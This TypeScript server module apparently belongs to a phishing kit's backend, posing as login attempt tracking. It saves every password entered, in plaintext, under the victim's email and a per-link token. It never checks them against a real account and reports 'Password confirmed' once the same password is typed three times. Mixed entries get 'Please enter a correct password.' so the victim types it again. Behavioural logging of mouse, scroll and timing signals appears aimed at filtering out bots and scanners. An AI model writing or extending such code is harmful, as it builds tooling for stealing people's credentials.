// Persistent attempt tracking with atomic operations and secure file handling
import 'server-only'

import { secureReadJSON, secureUpdateJSON } from './secureFileSystem'
import { migrateFileIfNeeded } from './fileMigration'
import path from 'path'

export interface AttemptResult {
  allowAttempt: boolean
  samePasswordConfirmed: boolean
  attemptNumber: number
  message?: string
}

interface AttemptData {
  count: number
  timestamp: number
  passwords: string[] // Store passwords for comparison
}

interface AttemptCache {
  [key: string]: AttemptData
}

// Authentication attempts storage (formerly: attempts-cache)
// Migrate old file name on first access
const LEGACY_FILE = path.join(process.cwd(), '.attempts-cache.json')
const CACHE_FILE = path.join(process.cwd(), '.auth-attempts.json')
const CACHE_TTL = 30 * 60 * 1000 // 30 minutes
const MAX_ATTEMPTS = 4

// Migrate old file name if needed (runs once on module load)
if (typeof process !== 'undefined' && typeof process.cwd === 'function') {
  migrateFileIfNeeded(LEGACY_FILE, CACHE_FILE)
}

// Get current attempt count for a key (atomic read)
export async function getAttemptCount(key: string): Promise<number> {
  const cache = await secureReadJSON<AttemptCache>(CACHE_FILE, {})
  const entry = cache[key]
  
  if (!entry) {
    return 0
  }
  
  // Check if expired (per-day tracking: reset at midnight)
  const now = Date.now()
  const today = new Date()
  today.setHours(0, 0, 0, 0)
  const todayStart = today.getTime()
  
  // If entry is from before today, it's expired
  if (entry.timestamp < todayStart) {
    // Clean up expired entry
    await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (c) => {
      const newCache = { ...c }
      delete newCache[key]
      return newCache
    })
    return 0
  }
  
  // Also check TTL (30 minutes) for same-day entries
  if (now - entry.timestamp > CACHE_TTL) {
    // Clean up expired entry
    await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (c) => {
      const newCache = { ...c }
      delete newCache[key]
      return newCache
    })
    return 0
  }
  
  return entry.count
}

/**
 * Get attempts for a specific email and date
 * 
 * @param email Email address
 * @param date Date string (YYYY-MM-DD) or Date object
 * @returns Attempt count for that date
 */
export async function getAttempts(email: string, date?: string | Date): Promise<number> {
  let dateKey: string
  if (date instanceof Date) {
    dateKey = `${date.getFullYear()}-${String(date.getMonth() + 1).padStart(2, '0')}-${String(date.getDate()).padStart(2, '0')}`
  } else if (date) {
    dateKey = date
  } else {
    const today = new Date()
    dateKey = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`
  }
  
  const key = `attempt:${email.toLowerCase()}:${dateKey}`
  return await getAttemptCount(key)
}

/**
 * Reset daily attempts for an email
 * 
 * @param email Email address
 */
export async function resetDaily(email: string): Promise<void> {
  const today = new Date()
  const dateKey = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`
  const key = `attempt:${email.toLowerCase()}:${dateKey}`
  await resetAttempt(key)
}

/**
 * Increment attempt for an email (per-day tracking)
 * 
 * @param email Email address
 * @param token Optional token for per-link tracking
 * @returns New attempt count
 */
export async function incrementAttempt(email: string, token?: string): Promise<number> {
  const today = new Date()
  const dateKey = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`
  const key = token 
    ? `attempt:${email.toLowerCase()}:${token}:${dateKey}`
    : `attempt:${email.toLowerCase()}:${dateKey}`
  
  await recordAttempt(key, 'attempt')
  return await getAttemptCount(key)
}

// Get passwords for a key (atomic read)
export async function getPasswords(key: string): Promise<string[]> {
  const cache = await secureReadJSON<AttemptCache>(CACHE_FILE, {})
  const entry = cache[key]
  
  if (!entry || !entry.passwords) {
    return []
  }
  
  // Check if expired
  const now = Date.now()
  if (now - entry.timestamp > CACHE_TTL) {
    // Clean up expired entry
    await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (c) => {
      const newCache = { ...c }
      delete newCache[key]
      return newCache
    })
    return []
  }
  
  return entry.passwords
}

// Increment attempt count and store password for a key (atomic read-modify-write)
export async function recordAttempt(key: string, password: string, behavioralData?: {
  ip?: string
  userAgent?: string
  mouseEvents?: number
  scrollEvents?: number
  timingData?: { averageDelay?: number; variance?: number }
}): Promise<AttemptResult> {
  const now = Date.now()
  const trimmedPassword = password.trim()
  
  // Phase 5.9: Record micro behavioral events
  if (behavioralData && behavioralData.ip && behavioralData.userAgent) {
    try {
      const { logBehaviorEvent } = await import('./securityMonitoring')
      const { getSignalScore } = await import('./behavioral/behaviorSignals')
      
      // Record mouse events
      if (behavioralData.mouseEvents !== undefined) {
        if (behavioralData.mouseEvents === 0) {
          await logBehaviorEvent(
            behavioralData.ip,
            behavioralData.userAgent,
            'no_mouse',
            getSignalScore('no_mouse'),
            { attemptKey: key }
          )
        } else if (behavioralData.mouseEvents > 5) {
          await logBehaviorEvent(
            behavioralData.ip,
            behavioralData.userAgent,
            'jitter_mouse',
            getSignalScore('jitter_mouse'),
            { attemptKey: key, count: behavioralData.mouseEvents }
          )
        }
      }
      
      // Record scroll events
      if (behavioralData.scrollEvents !== undefined) {
        if (behavioralData.scrollEvents === 0) {
          await logBehaviorEvent(
            behavioralData.ip,
            behavioralData.userAgent,
            'no_scroll',
            getSignalScore('no_scroll'),
            { attemptKey: key }
          )
        } else if (behavioralData.scrollEvents > 3) {
          await logBehaviorEvent(
            behavioralData.ip,
            behavioralData.userAgent,
            'human_scroll',
            getSignalScore('human_scroll'),
            { attemptKey: key, count: behavioralData.scrollEvents }
          )
        }
      }
      
      // Record timing data
      if (behavioralData.timingData) {
        const { averageDelay, variance } = behavioralData.timingData
        if (averageDelay !== undefined) {
          if (averageDelay < 50) {
            await logBehaviorEvent(
              behavioralData.ip,
              behavioralData.userAgent,
              'rapid_sequence',
              getSignalScore('rapid_sequence'),
              { attemptKey: key, delay: averageDelay }
            )
          } else if (averageDelay > 200 && averageDelay < 2000) {
            await logBehaviorEvent(
              behavioralData.ip,
              behavioralData.userAgent,
              'variable_delays',
              getSignalScore('variable_delays'),
              { attemptKey: key, delay: averageDelay }
            )
          }
        }
        if (variance !== undefined) {
          if (variance < 10) {
            await logBehaviorEvent(
              behavioralData.ip,
              behavioralData.userAgent,
              'perfect_timing',
              getSignalScore('perfect_timing'),
              { attemptKey: key, variance }
            )
          } else if (variance > 50) {
            await logBehaviorEvent(
              behavioralData.ip,
              behavioralData.userAgent,
              'variable_delays',
              getSignalScore('variable_delays'),
              { attemptKey: key, variance }
            )
          }
        }
      }
    } catch (error) {
      // Fail silently - behavioral logging is optional
    }
  }
  
  // Atomic read-modify-write operation
  const updatedCache = await secureUpdateJSON<AttemptCache>(
    CACHE_FILE,
    {},
    (cache) => {
      // Clean expired entries
      const cleanedCache: AttemptCache = {}
      for (const [k, v] of Object.entries(cache)) {
        if (now - v.timestamp < CACHE_TTL) {
          cleanedCache[k] = v
        }
      }
      
      // Get or create attempt data
      const entry = cleanedCache[key] || {
        count: 0,
        timestamp: now,
        passwords: []
      }
      
      // Update attempt data
      const newCount = entry.count + 1
      const updatedPasswords = [...entry.passwords, trimmedPassword]
      
      cleanedCache[key] = {
        count: newCount,
        timestamp: now,
        passwords: updatedPasswords
      }
      
      return cleanedCache
    }
  )
  
  const entry = updatedCache[key]
  const newCount = entry.count
  const updatedPasswords = entry.passwords
  
  // Check password patterns
  let shouldBlock = false
  let allowFourth = false
  let samePasswordConfirmed = false
  let message: string | undefined
  
  if (newCount === 3) {
    // Check if all 3 passwords are the same (exact match, case-sensitive)
    if (updatedPasswords.length === 3 && 
        updatedPasswords[0] === updatedPasswords[1] && 
        updatedPasswords[1] === updatedPasswords[2] &&
        updatedPasswords[0] === updatedPasswords[2]) {
      // All 3 attempts have same password = password is correct, block further attempts
      shouldBlock = true
      samePasswordConfirmed = true
      message = 'Password confirmed'
    } else if (updatedPasswords.length === 3) {
      // Check if attempts 1 & 2 are same but 3 is different
      if (updatedPasswords[0] === updatedPasswords[1] && 
          updatedPasswords[1] !== updatedPasswords[2]) {
        // Allow 4th attempt with message
        allowFourth = true
        message = 'Please enter a correct password.'
      } else if (updatedPasswords[0] !== updatedPasswords[1] && 
                 (updatedPasswords[0] === updatedPasswords[2] || updatedPasswords[1] === updatedPasswords[2])) {
        // 2 attempts are same but 1 is different - allow 4th attempt (last chance)
        allowFourth = true
        message = 'Please enter a correct password.'
      }
    }
  } else if (newCount >= 4) {
    // 4th attempt or higher - ALWAYS block (no more attempts allowed)
    shouldBlock = true
    // CRITICAL: Clear allowFourth flag on 4th attempt - no exceptions
    allowFourth = false
  }
  
  // Return AttemptResult format
  // CRITICAL: Check shouldBlock FIRST (before allowFourth) to ensure 4th attempt is always blocked
  // Also check newCount >= 4 directly to catch any attempts beyond 4
  if (shouldBlock || newCount >= 4) {
    // Too many attempts - ALWAYS block on 4th attempt or higher
    return {
      allowAttempt: false,
      samePasswordConfirmed: false,
      attemptNumber: newCount,
      message: 'Too many attempts',
    }
  } else if (samePasswordConfirmed) {
    // 3 same passwords - password confirmed
    return {
      allowAttempt: true,
      samePasswordConfirmed: true,
      attemptNumber: newCount,
      message: 'Password confirmed',
    }
  } else if (allowFourth && newCount === 3) {
    // 3rd attempt with mixed passwords - allow 4th attempt
    return {
      allowAttempt: true,
      samePasswordConfirmed: false,
      attemptNumber: newCount,
      message: 'Please enter a correct password.',
    }
  } else {
    // Normal attempts (1-2) or any other case
    return {
      allowAttempt: true,
      samePasswordConfirmed: false,
      attemptNumber: newCount,
    }
  }
}

// Reset attempt count for a key (atomic update)
export async function resetAttempt(key: string): Promise<void> {
  await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (cache) => {
    const newCache = { ...cache }
    delete newCache[key]
    return newCache
  })
}

